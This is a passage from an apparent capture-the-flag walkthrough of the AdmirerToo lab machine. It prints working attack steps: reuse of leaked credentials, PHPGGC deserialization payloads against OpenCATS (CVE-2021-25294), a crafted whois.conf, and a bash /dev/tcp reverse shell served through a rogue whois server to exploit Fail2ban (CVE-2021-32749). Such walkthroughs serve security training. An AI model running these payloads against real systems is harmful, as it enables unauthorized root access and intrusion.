[cats_dev]&gt; SHOW TABLES;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Tables_in_cats_dev                   |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| access_level                         |</span><br><span class="line">| [...]                                |</span><br><span class="line">| system                               |</span><br><span class="line">| tag                                  |</span><br><span class="line">| user                                 |</span><br><span class="line">| user_login                           |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">55 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; SELECT user_id,user_name,password FROM user;</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">| user_id | user_name      | password                         |</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">|       1 | admin          | dfa2a420a4e48de6fe481c90e295fe97 |</span><br><span class="line">|    1250 | cats@rootadmin | cantlogin                        |</span><br><span class="line">|    1251 | jennifer       | f59f297aa82171cc860d76c390ce7f3e |</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>We find a MD5 hash for <code>admin</code> user and <code>jennifer</code>. Unfortunately none of the hash can’t be found in MD5 reverse database. We are maybe on the wrong track for now. </p>
<h3 id="jennifer-password-re-use"><a href="#jennifer-password-re-use" class="headerlink" title="jennifer password re-use"></a>jennifer password re-use</h3><p>Going back to our enumeration we stumble upon the install folder of the Adminer application and find a commented out password:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo$ cat /<span class="keyword">var</span>/www/adminer/plugins/data/servers.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">  <span class="string">&#x27;localhost&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//    &#x27;username&#x27; =&gt; &#x27;admirer&#x27;,</span></span><br><span class="line"><span class="comment">//    &#x27;pass&#x27;     =&gt; &#x27;bQ3u7^AxzcB7qAsxE3&#x27;,</span></span><br><span class="line"><span class="comment">// Read-only account for testing</span></span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;admirer_ro&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pass&#x27;</span>     =&gt; <span class="string">&#x27;1w4nn4b3adm1r3d2!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;label&#x27;</span>    =&gt; <span class="string">&#x27;MySQL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;admirer&#x27;</span> =&gt; <span class="string">&#x27;Admirer DB&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>Since it’s important to check everything, let’s try to login to <code>jennifer</code> SSH using one of the passwords we found so far ? (<code>1w4nn4b3adm1r3d2!</code>, <code>adm1r3r0fc4ts</code>, <code>bQ3u7^AxzcB7qAsxE3</code>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh jennifer@admirertoo.htb</span><br><span class="line">jennifer@admirertoo.htb<span class="string">&#x27;s password: bQ3u7^AxzcB7qAsxE3</span></span><br><span class="line"><span class="string">Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jennifer@admirertoo:~$ cat user.txt</span></span><br><span class="line"><span class="string">3706xxxxxxxxxxxxx7062</span></span><br></pre></td></tr></table></figure>

<p>I wasn’t expecting it to work, it’s a good reminder to stick to the basics even on “Hard” rated difficulty box :) </p>
<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>So now that we are on <code>jennifer</code> account we can probably continue our recon on <code>opencats</code> application. First we can confirm it’s accessible from <code>jennifer</code> user:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>opencats - Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="Into-the-Opencats-rabbit-hole"><a href="#Into-the-Opencats-rabbit-hole" class="headerlink" title="Into the Opencats rabbit hole"></a>Into the Opencats rabbit hole</h3><p>Let’s port forward <code>opencats</code> to our machine to take a better look at it:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L <span class="number">9000</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> jennifer@admirertoo.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/166157419-74b39d1a-00fb-44b1-87a6-16ca85fe01fa.png" alt="https://user-images.githubusercontent.com/9076747/166157419-74b39d1a-00fb-44b1-87a6-16ca85fe01fa.png"></p>
<p>We are presented with a login page telling us the version number (<code>0.9.5.2</code>). A quick Google search return an interesting vulnerability for this version: </p>
<blockquote>
<p><strong>OpenCATS PHP Object Injection to Arbitrary File Write (CVE-2021-25294)</strong><br>OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests,<br>leading to remote code execution. This occurs because lib/DataGrid.php calls<br>unserialize for the parametersactivity:ActivityDataGrid parameter. The PHP object<br>injection exploit chain can leverage an __destruct magic method in guzzlehttp.<br><a target="_blank" rel="noopener" href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</a></p>
</blockquote>
<p>The blog post is very well explained and contains a PoC so let’s give a try.</p>
<p>First of all since we have write access to the database let’s just overwrite the <code>admin</code> password with our own to login to <code>opencats</code> admin panel:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> -n hg8 | md5sum</span><br><span class="line">70595983983f280d57999c58eda9f2a3  -</span><br><span class="line">$ mysql -u cats -p</span><br><span class="line">Enter password:</span><br><span class="line">MariaDB [(none)]&gt; use cats_dev;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cats_dev]&gt; update user <span class="built_in">set</span> password = <span class="string">&#x27;70595983983f280d57999c58eda9f2a3&#x27;</span> <span class="built_in">where</span> user_id=1;</span><br><span class="line">Query OK, 1 row affected (0.006 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>We can now connect:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/166157962-5641a55a-f3f0-475a-9733-0ca5d2f9bda7.png" alt="https://user-images.githubusercontent.com/9076747/166157962-5641a55a-f3f0-475a-9733-0ca5d2f9bda7.png"></p>
<p>In order to exploit the vulnerability, as explained in the blog post, we need to go to the <code>activities</code> tab, select the <code>date</code> page and intercept the request in Burp:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/166158220-76cdd510-dcc0-467b-a03d-2686c1f7932c.png" alt="https://user-images.githubusercontent.com/9076747/166158220-76cdd510-dcc0-467b-a03d-2686c1f7932c.png"></p>
<p>According to the vulnerability write-up, the <code>activity</code> parameter is vulnerable. So, we need to generate a serialized exploit using PHPGGC and replace the default one with it.</p>
<p>We have no information to know where to upload the PHP webshell nor which users permission will be applied. Let’s try to upload to the usual <code>/dev/shm</code> directory to check the file permission:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt;&gt; hg8</span><br><span class="line">[hg8@archbook ~]$ ./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/hg8 hg8</span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A5%3A%22test%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A12%3A%22%2Fdev%2Fshm%2Fhg8%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure>

<p>We can place our payload in the intercepted request: </p>
<p><img src="https://user-images.githubusercontent.com/9076747/166158784-88bca3af-6e56-44f2-8a91-a03e9f76ce56.png" alt="https://user-images.githubusercontent.com/9076747/166158784-88bca3af-6e56-44f2-8a91-a03e9f76ce56.png"></p>
<p>And it works, we can find our file under <code>/dev/shm</code> directory. As expected the file is not owned by <code>root</code> user but by <code>devel</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ ls -la /dev/shm</span><br><span class="line">-rw-r--r--  1 devel devel   48 May  1 19:03 hg8</span><br></pre></td></tr></table></figure>

<p>On top of that <code>devel</code> only have write permission to a few useless directory and don’t even have shell access:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null</span><br><span class="line">/dev/shm/hg8</span><br><span class="line">/opt/opencats/INSTALL_BLOCK</span><br><span class="line">/usr/<span class="built_in">local</span>/src</span><br><span class="line">/usr/<span class="built_in">local</span>/etc</span><br><span class="line">jennifer@admirertoo:~$ cat /etc/passwd | grep devel</span><br><span class="line">devel:x:1003:1003::/home/devel:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>Bummer…. Looks like we are on a dead end here. </p>
<p>Let’s continue our search.</p>
<h3 id="Fail2ban-Remote-Code-Execution"><a href="#Fail2ban-Remote-Code-Execution" class="headerlink" title="Fail2ban Remote Code Execution"></a>Fail2ban Remote Code Execution</h3><p>During the recon process I noticed a <code>fail2ban</code> service running, but I didn’t pay that much attention since it’s a quite common service on boxes. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ ls -l /etc/init.d/*</span><br><span class="line">-rwxr-xr-x 1 root     root     8181 Aug  8  2020 /etc/init.d/apache2</span><br><span class="line">-rwxr-xr-x 1 root     root     2489 Aug  8  2020 /etc/init.d/apache-htcacheclean</span><br><span class="line">-rwxr-xr-x 1 root     root     3740 Mar 30  2019 /etc/init.d/apparmor</span><br><span class="line">-rwxr-xr-x 1 root     root     1232 Aug 15  2019 /etc/init.d/console-setup.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     3059 Oct 11  2019 /etc/init.d/cron</span><br><span class="line">-rwxr-xr-x 1 root     root     2813 Jul  5  2020 /etc/init.d/dbus</span><br><span class="line">-rwxr-xr-x 1 root     root     7159 May 23  2020 /etc/init.d/exim4</span><br><span class="line">-rwxr-xr-x 1 root     root     6712 Sep 23  2018 /etc/init.d/fail2ban</span><br><span class="line">-rwxr-xr-x 1 root     root     3809 Jan 10  2019 /etc/init.d/hwclock.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     1479 Oct 10  2016 /etc/init.d/keyboard-setup.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     2044 Feb  9  2019 /etc/init.d/kmod</span><br><span class="line">-rwxr-xr-x 1 root     root     5930 May 10  2021 /etc/init.d/mysql</span><br><span class="line">-rwxr-xr-x 1 root     root     4445 Aug 25  2018 /etc/init.d/networking</span><br><span class="line">-rwxr-xr-x 1 opentsdb opentsdb 2863 Jul  9  2021 /etc/init.d/opentsdb</span><br><span class="line">-rwxr-xr-x 1 root     root     1846 Oct  9  2019 /etc/init.d/open-vm-tools</span><br><span class="line">-rwxr-xr-x 1 root     root     4793 Oct 24  2021 /etc/init.d/php7.3-fpm</span><br><span class="line">-rwxr-xr-x 1 root     root      924 May 31  2018 /etc/init.d/procps</span><br><span class="line">-rwxr-xr-x 1 root     root     4417 Mar 15  2019 /etc/init.d/rsync</span><br><span class="line">-rwxr-xr-x 1 root     root     2864 Feb 26  2019 /etc/init.d/rsyslog</span><br><span class="line">-rwxr-xr-x 1 root     root     3939 Jan 31  2020 /etc/init.d/ssh</span><br><span class="line">-rwxr-xr-x 1 root     root     6872 Jan 29  2021 /etc/init.d/udev</span><br><span class="line">-rwxr-xr-x 1 root     root     2757 Nov 23  2016 /etc/init.d/x11-common</span><br><span class="line"></span><br><span class="line">jennifer@admirertoo:~$ fail2ban-client --version</span><br><span class="line">Fail2Ban v0.10.2</span><br></pre></td></tr></table></figure>

<p>However when searching for the running version (<code>0.10.2</code>), we stumble upon an interesting vulnerability:</p>
<blockquote>
<p><strong>Possible RCE vulnerability in mailing action using mailutils (CVE-2021-32749)</strong><br>Command mail from mailutils package used in mail actions like mail-whois can execute command if unescaped sequences (\n~) are available in “foreign” input (for instance in whois output).<br><a target="_blank" rel="noopener" href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm</a></p>
</blockquote>
<p><code>fail2ban</code> is tool used to analyse logs (or other data sources) in search of brute force traces in order to block such attempts based on the IP address. There are plenty of rules for different services (SSH, SMTP, HTTP, etc.). There are also defined actions which could be performed after blocking a client. One of these actions is sending an e-mail:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;test e-mail&quot;</span> | mail -s <span class="string">&quot;subject&quot;</span> user@example.org</span><br></pre></td></tr></table></figure>

<p>Looking at the config file on the box we confirm that <code>fail2ban</code> use <code>mail</code> as Mail Transfer Agent (mta) to notify when a brute-force attempt is detected:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.local</span><br><span class="line">[DEFAULT]</span><br><span class="line">ignoreip = 127.0.0.1</span><br><span class="line">bantime = 60s</span><br><span class="line">destemail = root@admirertoo.htb</span><br><span class="line">sender = fail2ban@admirertoo.htb</span><br><span class="line">sendername = Fail2ban</span><br><span class="line">mta = mail</span><br><span class="line">action = %(action_mwl)s</span><br></pre></td></tr></table></figure>

<p>Digging into the config file we can find that only the <code>sshd</code> jail is activated:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf</span><br><span class="line">[sshd]</span><br><span class="line">enabled = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>We have the possibility to trigger the jail by sending brute-force attempts on the SSH port. Once triggered the jail will send an email to <code>root@admirertoo.htb</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/etc/fail2ban$ cat action.d/mail.conf</span><br><span class="line">[...]</span><br><span class="line">actionban = <span class="built_in">printf</span> %%b <span class="string">&quot;Hi,\n</span></span><br><span class="line"><span class="string">            The IP &lt;ip&gt; has just been banned by Fail2Ban after</span></span><br><span class="line"><span class="string">            &lt;failures&gt; attempts against &lt;name&gt;.\n\n</span></span><br><span class="line"><span class="string">            Here is more information about &lt;ip&gt; :\n</span></span><br><span class="line"><span class="string">            `%(_whois_command)s`\n</span></span><br><span class="line"><span class="string">            Regards,\n</span></span><br><span class="line"><span class="string">            Fail2Ban&quot;</span>|mail -s <span class="string">&quot;[Fail2Ban] &lt;name&gt;: banned &lt;ip&gt; from &lt;fq-hostname&gt;&quot;</span> &lt;dest&gt;</span><br></pre></td></tr></table></figure>

<p>According to the vulnerability writeup we need to control our whois server response to hold the malicious payload. </p>
<h3 id="Malicious-whois-server"><a href="#Malicious-whois-server" class="headerlink" title="Malicious whois server"></a>Malicious whois server</h3><p>First of all, we need to configure <code>whois</code> to connect to our own server. Unfortunately we don’t have permission to edit <code>/etc/hosts</code> to do so…</p>
<p>One alternative is taking advantage of the <code>whois.conf</code> config file to define the IP address of the Whois server to use.<br>Again we don’t have write permission to the <code>/etc/</code>  folder either. </p>
<p>That’s where the <code>opencats</code> arbitrary file will come useful since it gives us permission to write to <code>/usr/local/etc</code> (local equivalent to <code>/etc</code> for software).</p>
<p>Trying to do so we quickly stumble upon another blocker, the file we uploaded earlier using <code>opencats</code> vulnerability output the following format:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /dev/shm/hg8</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;test\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>Our actual <code>test</code> string is only a part of the file content created by <code>opencats</code>. </p>
<p>This is not going to work for our initial plan to create the <code>whois.conf</code> since <code>whois</code> expect the configuration file to be a server address or domain name list:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man whois.conf</span><br><span class="line">[...]</span><br><span class="line">This file contains a list of WHOIS servers <span class="built_in">which</span> can augment or override the built-in list of the client.</span><br><span class="line">It<span class="string">&#x27;s a plain text file in ASCII encoding. Each line consists of two fields: a pattern to match WHOIS object identifier and a corresponding WHOIS server domain name.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Fields are separated by non-empty sequence of space or a tabular characters. A line starting with a hash character is a free comment and it&#x27;</span>s not considered.</span><br></pre></td></tr></table></figure>

<p>Just to make sure we can give a try on our local machine:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /usr/<span class="built_in">local</span>/etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;10.10.14.67\n&quot;</span>&#125;]</span><br><span class="line">[hg8@archbook ~]$ whois example.org</span><br><span class="line">Cannot parse this line: [&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;10.10.14.67\n&quot;</span>&#125;] </span><br></pre></td></tr></table></figure>

<p>We get a parsing error message as expected. However when checking the <a target="_blank" rel="noopener" href="https://github.com/rfc1036/whois/blob/master/whois.c#L458">source code</a> of <code>whois</code> we can see that a regex is being applied to extract the server IP Address or Domain name. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /ect/whois.conf</span><br><span class="line"><span class="comment"># whois configuration file</span></span><br><span class="line">[..] </span><br><span class="line"><span class="comment"># Each entry is a single</span></span><br><span class="line"><span class="comment"># text line and consists of a regular expression pattern to match and</span></span><br><span class="line"><span class="comment"># the whois server to be used for it, separated by blank space.</span></span><br></pre></td></tr></table></figure>

<p>So if we include a proper regex escape maybe the config file can be parsed properly.</p>
<p>After digging in the madness of regex and several trial and errors we can come up with the following valid format:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">&quot;Expires&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/166314333-56a95f13-e803-4e87-93db-06c44bdbc0c4.png" alt="https://user-images.githubusercontent.com/9076747/166314333-56a95f13-e803-4e87-93db-06c44bdbc0c4.png"></p>
<p>Once placed in the config, it is parsed correctly:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br><span class="line">[hg8@archbook ~]$ whois example.org</span><br><span class="line">connect: Connection refused</span><br></pre></td></tr></table></figure>

<p>We can now go back to the <code>opencats</code> vulnerability and send the following payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat whoisconf</span><br><span class="line">&#125;]|. [10.10.14.67]</span><br></pre></td></tr></table></figure>

<p>Let’s build it as we did earlier:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./phpggc -u --fast-destruct Guzzle/FW1 /usr/<span class="built_in">local</span>/etc/whois.conf whoisconf</span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.67%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure>

<p>Then intercept and inject the payload with Burp. We can then verify it’s been upload properly using <code>jennifer</code> account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /usr/<span class="built_in">local</span>/etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>Let’s open our reverse shell listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br></pre></td></tr></table></figure>

<p>Now we create our reverse shell and host it on a simple <code>whois</code> sever containing the reverse shell payload according to the <code>fail2ban</code> vulnerability write-up:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8shell</span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.67/8585 0&gt;&amp;1&quot;</span> &amp;</span><br><span class="line">$ sudo nc -nvlkp 43 -c <span class="string">&quot;cat hg8shell&quot;</span></span><br><span class="line">listening on [any] 43 ...</span><br></pre></td></tr></table></figure>

<p>We can verify from <code>jennifer</code> account that our <code>whois</code> server return the correct payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ whois 10.10.14.67</span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.67/8585 0&gt;&amp;1&quot;</span> &amp;</span><br></pre></td></tr></table></figure>

<p>Last step is to trigger <code>fail2ban</code> to send an email by attempting a brute-force on the SSH port:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh jennifer@10.129.96.181</span><br><span class="line">jennifer@10.129.96.181<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">jennifer@10.129.96.181&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jennifer@10.129.96.181<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">jennifer@10.129.96.181: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure>

<p>In order to get the attacker information, <code>fail2ban</code> will perform a <code>whois</code> on our IP, which will return the malicious payload to be executed by <code>fail2ban</code> as root:</p>
